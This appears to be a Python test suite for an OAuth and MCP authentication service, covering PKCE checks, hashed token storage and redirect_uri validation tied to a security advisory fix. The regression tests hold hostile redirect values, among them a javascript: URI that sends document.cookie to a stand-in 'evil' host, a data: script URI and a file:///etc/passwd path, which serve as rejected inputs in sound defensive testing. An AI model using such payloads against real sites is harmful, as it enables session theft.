import base64
import hashlib
import json
import unittest
import uuid
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch
from urllib.parse import parse_qs, urlencode, urlparse

from fastapi import HTTPException, Request

from app.api.mcp import get_mcp_user
from app.api.mcp_servers import _get_named_server_context
from app.api.oauth import (
    _generate_csrf_token,
    _issue_tokens,
    _validate_pkce_request,
    _verify_pkce,
    authorize_get,
    authorize_post,
    register_client,
    token_endpoint,
)
from app.db.models import OAuthAccessToken, OAuthAuthorizationCode
from app.services.oauth_tokens import hash_oauth_token, oauth_token_lookup_values


def _pkce_challenge(verifier: str) -> str:
    digest = hashlib.sha256(verifier.encode()).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode()


def _query_result(value: object) -> MagicMock:
    return MagicMock(scalar_one_or_none=MagicMock(return_value=value))


def _request(
    *,
    method: str = "POST",
    path: str = "/",
    data: dict[str, str] | None = None,
    query_string: bytes = b"",
    headers: list[tuple[bytes, bytes]] | None = None,
) -> Request:
    body = urlencode(data or {}).encode()
    request_headers = headers or []
    if data is not None:
        request_headers = [
            *request_headers,
            (b"content-type", b"application/x-www-form-urlencoded"),
        ]

    async def receive() -> dict[str, object]:
        return {
            "type": "http.request",
            "body": body,
            "more_body": False,
        }

    return Request(
        {
            "type": "http",
            "method": method,
            "path": path,
            "headers": request_headers,
            "query_string": query_string,
        },
        receive,
    )


def _compiled_in_values(statement: object, param_name: str) -> list[str]:
    compiled = statement.compile()
    values = compiled.params[param_name]
    return list(values)


class OAuthPKCETests(unittest.TestCase):
    def test_verify_pkce_accepts_s256_challenge(self) -> None:
        verifier = "correct-horse-battery-staple"
        self.assertTrue(_verify_pkce(_pkce_challenge(verifier), verifier))

    def test_public_client_requires_s256_pkce(self) -> None:
        client = SimpleNamespace(is_confidential=False)

        with self.assertRaises(HTTPException) as ctx:
            _validate_pkce_request(client, "", "")

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_request")

    def test_confidential_client_may_skip_pkce(self) -> None:
        client = SimpleNamespace(is_confidential=True)

        self.assertEqual(_validate_pkce_request(client, "", ""), ("", ""))

    def test_unsupported_pkce_method_is_rejected(self) -> None:
        client = SimpleNamespace(is_confidential=True)

        with self.assertRaises(HTTPException) as ctx:
            _validate_pkce_request(client, "challenge", "plain")

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_request")

    def test_pkce_values_are_normalized_for_storage(self) -> None:
        client = SimpleNamespace(is_confidential=False)
        challenge = _pkce_challenge("verifier")

        self.assertEqual(
            _validate_pkce_request(client, f" {challenge} ", " S256 "),
            (challenge, "S256"),
        )


class OAuthEndpointFlowTests(unittest.IsolatedAsyncioTestCase):
    async def test_authorize_endpoint_rejects_public_client_without_pkce(self) -> None:
        client = SimpleNamespace(
            client_id="public-client",
            client_name="Public Client",
            redirect_uris=["https://client.example/callback"],
            is_confidential=False,
        )
        db = AsyncMock()
        db.execute = AsyncMock(return_value=_query_result(client))

        with self.assertRaises(HTTPException) as ctx:
            await authorize_get(
                request=_request(method="GET", path="/authorize"),
                client_id=client.client_id,
                redirect_uri=client.redirect_uris[0],
                db=db,
            )

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_request")

    async def test_authorize_and_token_endpoints_exchange_public_pkce_code(self) -> None:
        client = SimpleNamespace(
            client_id="public-client",
            client_name="Public Client",
            redirect_uris=["https://client.example/callback"],
            is_confidential=False,
        )
        user = SimpleNamespace(id=uuid.uuid4(), email="user@example.com", hashed_password="hash")
        verifier = "correct-horse-battery-staple"
        challenge = _pkce_challenge(verifier)

        added: list[object] = []
        db = AsyncMock()
        db.add = MagicMock(side_effect=added.append)
        db.flush = AsyncMock()
        db.execute = AsyncMock(
            side_effect=[
                _query_result(client),
                _query_result(user),
            ]
        )

        authorize_response = None
        with patch("app.api.oauth.verify_password", return_value=True):
            authorize_response = await authorize_post(
                request=_request(
                    path="/authorize",
                    data={
                        "client_id": client.client_id,
                        "redirect_uri": client.redirect_uris[0],
                        "scope": "mcp",
                        "state": "state-123",
                        "code_challenge": f" {challenge} ",
                        "code_challenge_method": " S256 ",
                        "csrf_token": _generate_csrf_token(client.client_id),
                        "email": user.email,
                        "password": "secret",
                    },
                ),
                db=db,
            )

        self.assertEqual(authorize_response.status_code, 302)
        auth_code = next(obj for obj in added if isinstance(obj, OAuthAuthorizationCode))
        self.assertEqual(auth_code.code_challenge, challenge)
        self.assertEqual(auth_code.code_challenge_method, "S256")

        redirect_params = parse_qs(urlparse(authorize_response.headers["location"]).query)
        self.assertEqual(redirect_params["code"], [auth_code.code])
        self.assertEqual(redirect_params["state"], ["state-123"])

        db.execute = AsyncMock(
            side_effect=[
                _query_result(client),
                _query_result(auth_code),
            ]
        )
        token_response = await token_endpoint(
            request=_request(
                path="/token",
                data={
                    "grant_type": "authorization_code",
                    "client_id": client.client_id,
                    "code": auth_code.code,
                    "redirect_uri": client.redirect_uris[0],
                    "code_verifier": verifier,
                },
            ),
            db=db,
        )

        self.assertTrue(auth_code.used)
        self.assertEqual(token_response.status_code, 200)
        token_body = json.loads(token_response.body.decode())
        self.assertEqual(token_body["token_type"], "bearer")
        token_record = next(obj for obj in added if isinstance(obj, OAuthAccessToken))
        self.assertEqual(token_record.access_token, hash_oauth_token(token_body["access_token"]))
        self.assertEqual(token_record.refresh_token, hash_oauth_token(token_body["refresh_token"]))


class OAuthTokenStorageTests(unittest.IsolatedAsyncioTestCase):
    async def test_issue_tokens_stores_hashes_not_returned_token_values(self) -> None:
        db = AsyncMock()
        db.add = MagicMock()
        db.flush = AsyncMock()

        result = await _issue_tokens(db, "client-id", uuid.uuid4(), "mcp")

        token_record = db.add.call_args.args[0]
        self.assertIsInstance(token_record, OAuthAccessToken)
        self.assertEqual(token_record.access_token, hash_oauth_token(result["access_token"]))
        self.assertEqual(token_record.refresh_token, hash_oauth_token(result["refresh_token"]))
        self.assertNotEqual(token_record.access_token, result["access_token"])
        self.assertNotEqual(token_record.refresh_token, result["refresh_token"])

    def test_lookup_values_include_hash_and_legacy_plaintext_token(self) -> None:
        values = oauth_token_lookup_values("legacy-token")

        self.assertEqual(values[0], hash_oauth_token("legacy-token"))
        self.assertEqual(values[1], "legacy-token")


class OAuthRegistrationTests(unittest.IsolatedAsyncioTestCase):
    async def test_register_rejects_unsupported_token_auth_method(self) -> None:
        request = SimpleNamespace(
            headers={},
            client=SimpleNamespace(host="127.0.0.1"),
            json=AsyncMock(
                return_value={
                    "client_name": "Bad Client",
                    "redirect_uris": ["https://example.com/callback"],
                    "token_endpoint_auth_method": "client_secret_jwt",
                }
            ),
        )
        db = AsyncMock()
        db.add = MagicMock()

        with patch("app.api.oauth.oauth_register_limiter.is_allowed", return_value=(True, None)):
            with self.assertRaises(HTTPException) as ctx:
                await register_client(request, db)

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")
        db.add.assert_not_called()


class MCPBearerTokenLookupTests(unittest.IsolatedAsyncioTestCase):
    async def test_default_mcp_auth_queries_hash_and_legacy_plaintext_token(self) -> None:
        raw_token = "legacy-access-token"
        user = SimpleNamespace(id=uuid.uuid4())
        token_record = SimpleNamespace(user_id=user.id)
        db = AsyncMock()
        db.execute = AsyncMock(
            side_effect=[
                _query_result(token_record),
                _query_result(user),
            ]
        )

        result = await get_mcp_user(
            request=_request(
                method="GET",
                path="/api/mcp/tools",
                headers=[(b"authorization", f"Bearer {raw_token}".encode())],
            ),
            x_mcp_key=None,
            db=db,
        )

        self.assertIs(result, user)
        token_query = db.execute.call_args_list[0].args[0]
        self.assertEqual(
            _compiled_in_values(token_query, "access_token_1"),
            list(oauth_token_lookup_values(raw_token)),
        )

    async def test_named_mcp_server_auth_queries_hash_and_legacy_plaintext_token(self) -> None:
        raw_token = "legacy-server-token"
        server_id = uuid.uuid4()
        user = SimpleNamespace(id=uuid.uuid4())
        server = SimpleNamespace(id=server_id, user_id=user.id)
        token_record = SimpleNamespace(user_id=user.id)
        db = AsyncMock()
        db.execute = AsyncMock(
            side_effect=[
                _query_result(token_record),
                _query_result(user),
                _query_result(server),
            ]
        )

        result_user, result_server = await _get_named_server_context(
            server_id=server_id,
            request=_request(
                method="GET",
                path=f"/api/mcp/servers/{server_id}/tools",
                headers=[(b"authorization", f"Bearer {raw_token}".encode())],
            ),
            x_mcp_key=None,
            db=db,
        )

        self.assertIs(result_user, user)
        self.assertIs(result_server, server)
        token_query = db.execute.call_args_list[0].args[0]
        self.assertEqual(
            _compiled_in_values(token_query, "access_token_1"),
            list(oauth_token_lookup_values(raw_token)),
        )


class TestValidateRedirectUri(unittest.TestCase):
    """Tests for OAuth redirect_uri validation. GHSA-pm6h-x3h5-j38h finding H3.

    The server must reject unsafe redirect URIs (javascript:, data:, file:,
    protocol-relative //attacker.com, fragments, non-https for non-localhost)
    at both registration and authorize time.
    """

    def test_validate_rejects_javascript_scheme(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        with self.assertRaises(HTTPException) as ctx:
            _validate_redirect_uri("javascript:alert(1)")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")

    def test_validate_rejects_data_scheme(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        with self.assertRaises(HTTPException) as ctx:
            _validate_redirect_uri("data:text/html,<script>alert(1)</script>")
        self.assertEqual(ctx.exception.status_code, 400)

    def test_validate_rejects_file_scheme(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        with self.assertRaises(HTTPException) as ctx:
            _validate_redirect_uri("file:///etc/passwd")
        self.assertEqual(ctx.exception.status_code, 400)

    def test_validate_rejects_protocol_relative_url(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        with self.assertRaises(HTTPException) as ctx:
            _validate_redirect_uri("//attacker.example/callback")
        # urlparse parses //attacker.com with scheme="" -- caught by the not-scheme check.
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("scheme", ctx.exception.detail["error_description"])

    def test_validate_rejects_empty_string(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        with self.assertRaises(HTTPException) as ctx:
            _validate_redirect_uri("")
        self.assertEqual(ctx.exception.status_code, 400)

    def test_validate_rejects_fragment(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        with self.assertRaises(HTTPException) as ctx:
            _validate_redirect_uri("https://example.com/callback#fragment")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("fragment", ctx.exception.detail["error_description"])

    def test_validate_rejects_non_https_for_non_localhost(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        with self.assertRaises(HTTPException) as ctx:
            _validate_redirect_uri("http://example.com/callback")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("https", ctx.exception.detail["error_description"])

    def test_validate_accepts_https(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        # Should not raise.
        _validate_redirect_uri("https://example.com/callback")
        _validate_redirect_uri("https://app.example.com/oauth/callback?foo=bar")

    def test_validate_accepts_localhost_http(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        # Local development exemption -- http:// is allowed for localhost variants.
        _validate_redirect_uri("http://localhost:3000/callback")
        _validate_redirect_uri("http://127.0.0.1:8080/callback")
        _validate_redirect_uri("http://[::1]:9000/callback")

    def test_validate_accepts_https_localhost(self) -> None:
        from app.api.oauth import _validate_redirect_uri

        _validate_redirect_uri("https://localhost:3000/callback")


class TestRedirectUriEndpointRegression(unittest.IsolatedAsyncioTestCase):
    """Endpoint-level regression tests for GHSA-pm6h-x3h5-j38h finding H3.

    The helper-level tests in TestValidateRedirectUri verify _validate_redirect_uri
    in isolation. These tests verify the actual HTTP endpoints reject unsafe URIs:

    1. register_client rejects an unsafe redirect_uri at registration time.
    2. authorize_get rejects an unsafe redirect_uri (legacy client registered before fix).
    3. authorize_post rejects an unsafe redirect_uri (the path that issues the auth code
       and returns the 302 -- the most critical path to cover).
    """

    async def test_register_rejects_javascript_redirect_uri(self) -> None:
        """register_client must reject a javascript: redirect_uri at registration."""
        request = SimpleNamespace(
            headers={},
            client=SimpleNamespace(host="127.0.0.1"),
            json=AsyncMock(
                return_value={
                    "client_name": "Malicious Client",
                    "redirect_uris": ["javascript:fetch('https://evil/'+document.cookie)"],
                    "token_endpoint_auth_method": "none",
                }
            ),
        )
        db = AsyncMock()
        db.add = MagicMock()

        with patch("app.api.oauth.oauth_register_limiter.is_allowed", return_value=(True, None)):
            with self.assertRaises(HTTPException) as ctx:
                await register_client(request, db)

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")
        db.add.assert_not_called()

    async def test_register_rejects_protocol_relative_redirect_uri(self) -> None:
        """register_client must reject a protocol-relative //attacker.com redirect_uri."""
        request = SimpleNamespace(
            headers={},
            client=SimpleNamespace(host="127.0.0.1"),
            json=AsyncMock(
                return_value={
                    "client_name": "Malicious Client",
                    "redirect_uris": ["//attacker.example/callback"],
                    "token_endpoint_auth_method": "none",
                }
            ),
        )
        db = AsyncMock()
        db.add = MagicMock()

        with patch("app.api.oauth.oauth_register_limiter.is_allowed", return_value=(True, None)):
            with self.assertRaises(HTTPException) as ctx:
                await register_client(request, db)

        self.assertEqual(ctx.exception.status_code, 400)
        db.add.assert_not_called()

    async def test_authorize_get_rejects_legacy_unsafe_redirect_uri(self) -> None:
        """authorize_get must reject an unsafe redirect_uri even if a legacy client
        has it registered (clients registered before the fix must be covered).
        """
        client = SimpleNamespace(
            client_id="legacy-client",
            client_name="Legacy Client",
            redirect_uris=["javascript:alert(1)"],  # registered before fix
            is_confidential=False,
        )
        db = AsyncMock()
        db.execute = AsyncMock(return_value=_query_result(client))

        with self.assertRaises(HTTPException) as ctx:
            await authorize_get(
                request=_request(method="GET", path="/authorize"),
                client_id=client.client_id,
                redirect_uri="javascript:alert(1)",
                db=db,
            )

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")

    async def test_authorize_post_rejects_legacy_unsafe_redirect_uri(self) -> None:
        """authorize_post must reject an unsafe redirect_uri even if a legacy client
        has it registered. This is the most critical path: it issues the auth code
        and returns the 302. Without the fix, the 302 Location would contain
        javascript:...?code=<auth_code>, leaking the code.
        """
        client = SimpleNamespace(
            client_id="legacy-client",
            client_name="Legacy Client",
            redirect_uris=["javascript:alert(1)"],  # registered before fix
            is_confidential=False,
        )
        user = SimpleNamespace(id=uuid.uuid4(), email="user@example.com", hashed_password="hash")
        db = AsyncMock()
        db.add = MagicMock()
        db.flush = AsyncMock()
        db.execute = AsyncMock(
            side_effect=[
                _query_result(client),
                _query_result(user),
            ]
        )

        with patch("app.api.oauth.verify_password", return_value=True):
            with self.assertRaises(HTTPException) as ctx:
                await authorize_post(
                    request=_request(
                        path="/authorize",
                        data={
                            "client_id": client.client_id,
                            "redirect_uri": "javascript:alert(1)",
                            "scope": "mcp",
                            "state": "state-123",
                            "code_challenge": _pkce_challenge("verifier"),
                            "code_challenge_method": "S256",
                            "csrf_token": _generate_csrf_token(client.client_id),
                            "email": user.email,
                            "password": "secret",
                        },
                    ),
                    db=db,
                )

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")
        # No auth code should have been issued.
        db.add.assert_not_called()
        db.flush.assert_not_awaited()


if __name__ == "__main__":
    unittest.main()
